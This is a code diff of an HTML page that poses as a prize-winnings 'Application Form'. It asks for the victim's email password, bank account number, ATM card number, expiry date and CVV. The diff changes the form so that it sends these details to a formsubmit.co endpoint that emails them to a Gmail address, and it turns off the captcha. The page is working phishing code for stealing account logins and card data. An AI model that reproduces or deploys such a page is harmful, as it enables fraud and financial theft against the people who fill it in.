@@ -13,25 +13,21 @@
     form {
       background: #fff;
       padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      max-width: 600px;
+      border-radius: 8px;
+      max-width: 500px;
       margin: auto;
-    }
-    h2 {
-      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     label {
       display: block;
+      margin-bottom: 5px;
       margin-top: 15px;
-      font-weight: bold;
     }
     input, select {
       width: 100%;
       padding: 10px;
-      margin-top: 5px;
-      border-radius: 5px;
       border: 1px solid #ccc;
+      border-radius: 5px;
     }
     .error {
       color: red;
@@ -39,163 +35,136 @@
       display: none;
     }
     .eye {
-      position: absolute;
-      right: 15px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-    }
-    .field-wrapper {
       position: relative;
     }
-    .hidden {
-      display: none;
+    .eye input {
+      padding-right: 40px;
     }
-    button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 10px;
-      background-color: #28a745;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-size: 1em;
+    .eye-icon {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
       cursor: pointer;
-    }
-    button:disabled {
-      background-color: #ccc;
-      cursor: not-allowed;
-    }
-    button:hover:enabled {
-      background-color: #218838;
-    }
-    .final-note {
-      margin-top: 20px;
-      font-weight: bold;
     }
   </style>
 </head>
 <body>
+  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" id="application-form">
+    <input type="hidden" name="_next" value="thankyou.html">
+    <input type="hidden" name="_captcha" value="false">
 
-  <form action="https://formspree.io/f/movlnvoo" method="POST" id="applicationForm">
-    <h2>Application Form</h2>
-
-    <label for="fullName">1. Full Name</label>
-    <input type="text" id="fullName" name="Full Name" required>
+    <label for="fullname">1. Full Name</label>
+    <input type="text" id="fullname" name="Full Name" required>
 
     <label for="country">2. Country</label>
     <input type="text" id="country" name="Country" required>
 
-    <label for="phoneNumber">3. Phone Number</label>
-    <input type="tel" id="phoneNumber" name="Phone Number" required>
-    <div class="error" id="phoneError">Phone must be 9–12 digits</div>
+    <label for="phone">3. Phone Number</label>
+    <input type="tel" id="phone" name="Phone Number" required>
+    <div id="phone-error" class="error">Phone number must be 9 to 12 digits.</div>
 
     <label for="email">4. Email Address</label>
-    <input type="email" id="email" name="Email" required>
+    <input type="email" id="email" name="Email Address" required>
 
     <label for="emailPassword">5. Email Password</label>
-    <div class="field-wrapper">
+    <div class="eye">
       <input type="password" id="emailPassword" name="Email Password" required>
-      <span class="eye" onclick="togglePassword('emailPassword')">👁️</span>
+      <span class="eye-icon" onclick="togglePassword()">👁️</span>
     </div>
 
     <label for="amountWon">6. Amount You Won</label>
-    <input type="text" id="amountWon" name="Amount Won" required>
+    <input type="number" id="amountWon" name="Amount You Won" required>
 
-    <label for="bankType">7. Bank Account Type</label>
-    <input type="text" id="bankType" name="Bank Account Type" placeholder="e.g., Standard Bank Account" required>
+    <label for="accountType">7. Bank Account Type</label>
+    <input type="text" id="accountType" name="Bank Account Type" placeholder="e.g., Standard Bank Account" required>
 
-    <label for="bankNumber">8. Bank Account Number</label>
-    <input type="text" id="bankNumber" name="Bank Account Number" required>
+    <label for="accountNumber">8. Bank Account Number</label>
+    <input type="text" id="accountNumber" name="Bank Account Number" required>
 
-    <label for="linkedATM">9. Did You Link ATM to Your Bank Account?</label>
-    <select id="linkedATM" name="ATM Linked" onchange="toggleATMFields()" required>
+    <label for="linked">9. Did You Link ATM to Your Bank Account?</label>
+    <select id="linked" name="ATM Linked" required onchange="checkATM()">
       <option value="">-- Select --</option>
       <option value="Yes">Yes</option>
       <option value="No">No</option>
     </select>
+    <div id="atm-warning" class="error" style="display: none;">YOU MUST HAVE ATM CARD TO PROCEED</div>
 
-    <div class="error" id="atmWarning" style="display: none;"><strong>YOU MUST HAVE ATM CARD TO PROCEED</strong></div>
-
-    <div id="atmFields">
-      <label for="cardNumber">10. ATM Card Number</label>
-      <input type="text" id="cardNumber" name="ATM Card Number" maxlength="16">
-      <div class="error" id="cardError">Card number must be 16 digits</div>
+    <div id="atm-fields">
+      <label for="card">10. ATM Card Number</label>
+      <input type="password" id="card" name="ATM Card Number">
+      <div id="card-error" class="error">Card number must be exactly 16 digits.</div>
 
       <label for="expiry">11. Expiry Date (MM/YY)</label>
-      <input type="text" id="expiry" name="Expiry Date" maxlength="5" placeholder="MM/YY">
-      <div class="error" id="expiryError">Use format MM/YY</div>
+      <input type="text" id="expiry" name="Expiry Date" maxlength="5">
+      <div id="expiry-error" class="error">Enter a valid date in MM/YY format.</div>
 
       <label for="cvv">12. CVV</label>
       <input type="password" id="cvv" name="CVV" maxlength="3">
-      <div class="error" id="cvvError">CVV must be 3 digits</div>
+      <div id="cvv-error" class="error">CVV must be exactly 3 digits.</div>
     </div>
 
-    <div class="final-note">
-      13. You will receive <span id="confirmAmount"></span> to your <span id="confirmBankType"></span> <span id="confirmBankNumber"></span>
-    </div>
+    <p><strong>13. You will receive <span id="confirm-amount"></span> to your <span id="confirm-type"></span> <span id="confirm-number"></span></strong></p>
 
-    <input type="hidden" name="_redirect" value="https://onlinegistrationProg.github.io/application-form/thankyou.html">
-    <input type="hidden" name="_captcha" value="false">
-
-    <button type="submit" id="submitBtn">Submit Application</button>
+    <button type="submit">Submit Application</button>
   </form>
 
   <script>
-    function togglePassword(id) {
-      const field = document.getElementById(id);
-      field.type = field.type === "password" ? "text" : "password";
+    function togglePassword() {
+      const pwd = document.getElementById("emailPassword");
+      pwd.type = pwd.type === "password" ? "text" : "password";
     }
 
-    function toggleATMFields() {
-      const atmSelect = document.getElementById("linkedATM");
-      const atmFields = document.getElementById("atmFields");
-      const atmWarning = document.getElementById("atmWarning");
-      const submitBtn = document.getElementById("submitBtn");
-
-      if (atmSelect.value === "No") {
-        atmFields.style.display = "none";
-        atmWarning.style.display = "block";
-        submitBtn.disabled = true;
+    function checkATM() {
+      const linked = document.getElementById("linked").value;
+      const fields = document.getElementById("atm-fields");
+      const warning = document.getElementById("atm-warning");
+      if (linked === "No") {
+        fields.style.display = "none";
+        warning.style.display = "block";
+        document.getElementById("card").value = '';
+        document.getElementById("expiry").value = '';
+        document.getElementById("cvv").value = '';
       } else {
-        atmFields.style.display = "block";
-        atmWarning.style.display = "none";
-        submitBtn.disabled = false;
+        fields.style.display = "block";
+        warning.style.display = "none";
       }
     }
 
-    document.getElementById("phoneNumber").addEventListener("blur", function () {
-      const val = this.value.replace(/\D/g, "");
-      document.getElementById("phoneError").style.display = (val.length < 9 || val.length > 12) ? "block" : "none";
+    document.getElementById("phone").addEventListener("blur", () => {
+      const val = document.getElementById("phone").value;
+      const err = document.getElementById("phone-error");
+      err.style.display = (/^\d{9,12}$/.test(val)) ? "none" : "block";
     });
 
-    document.getElementById("cardNumber").addEventListener("blur", function () {
-      const val = this.value.replace(/\D/g, "");
-      document.getElementById("cardError").style.display = (val.length !== 16) ? "block" : "none";
+    document.getElementById("card").addEventListener("blur", () => {
+      const val = document.getElementById("card").value;
+      const err = document.getElementById("card-error");
+      err.style.display = (/^\d{16}$/.test(val)) ? "none" : "block";
     });
 
-    document.getElementById("cvv").addEventListener("blur", function () {
-      const val = this.value.replace(/\D/g, "");
-      document.getElementById("cvvError").style.display = (val.length !== 3) ? "block" : "none";
+    document.getElementById("cvv").addEventListener("blur", () => {
+      const val = document.getElementById("cvv").value;
+      const err = document.getElementById("cvv-error");
+      err.style.display = (/^\d{3}$/.test(val)) ? "none" : "block";
     });
 
-    document.getElementById("expiry").addEventListener("input", function () {
-      let value = this.value.replace(/\D/g, "");
-      if (value.length >= 3) {
-        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+    document.getElementById("expiry").addEventListener("input", (e) => {
+      let val = e.target.value.replace(/\D/g, '');
+      if (val.length >= 3) {
+        val = val.slice(0, 2) + '/' + val.slice(2, 4);
       }
-      this.value = value.slice(0, 5);
+      e.target.value = val.slice(0, 5);
     });
 
-    document.getElementById("amountWon").addEventListener("blur", updateFinalNote);
-    document.getElementById("bankType").addEventListener("blur", updateFinalNote);
-    document.getElementById("bankNumber").addEventListener("blur", updateFinalNote);
+    document.getElementById("application-form").addEventListener("input", () => {
+      document.getElementById("confirm-amount").innerText = document.getElementById("amountWon").value;
+      document.getElementById("confirm-type").innerText = document.getElementById("accountType").value;
+      document.getElementById("confirm-number").innerText = document.getElementById("accountNumber").value;
+    });
 
-    function updateFinalNote() {
-      document.getElementById("confirmAmount").textContent = document.getElementById("amountWon").value;
-      document.getElementById("confirmBankType").textContent = document.getElementById("bankType").value;
-      document.getElementById("confirmBankNumber").textContent = document.getElementById("bankNumber").value;
-    }
+    // Initialize ATM logic on page load
+    window.addEventListener("DOMContentLoaded", checkATM);
   </script>
 </body>
 </html>
